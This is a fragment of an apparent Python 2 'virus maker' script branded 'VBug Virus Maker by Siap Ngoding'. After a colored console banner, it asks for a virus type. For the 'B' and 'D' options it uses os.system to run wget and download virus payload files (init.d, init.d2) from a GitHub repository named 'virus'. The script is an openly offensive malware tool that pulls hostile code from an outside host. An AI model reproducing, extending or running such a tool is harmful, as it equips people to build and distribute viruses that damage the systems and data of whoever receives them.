...
G = '\x1b[1;37m'
print '%s+---------------------------------------------------+%s' % (R, N)
print '%s||[#]%s--------------%s[ VBug  Virus Maker by Siap Ngoding | www.siapngoding.my.id ]%s---------------%s[#]||%s' % (Y, R, Y, R, Y, N)
...
if type_of_virus == 'B' or type_of_virus == 'b':
    ...
    os.system('wget https://raw.githubusercontent.com/siapngoding/virus/main/init.d2')
    ...
    if type_of_virus == 'D' or type_of_virus == 'd':
        print '\n %s[%s+%s]%s Download the virus%s...%s' % (Y, R, Y, G, R, N)
        os.system('wget https://raw.githubusercontent.com/siapngoding/virus/main/init.d')
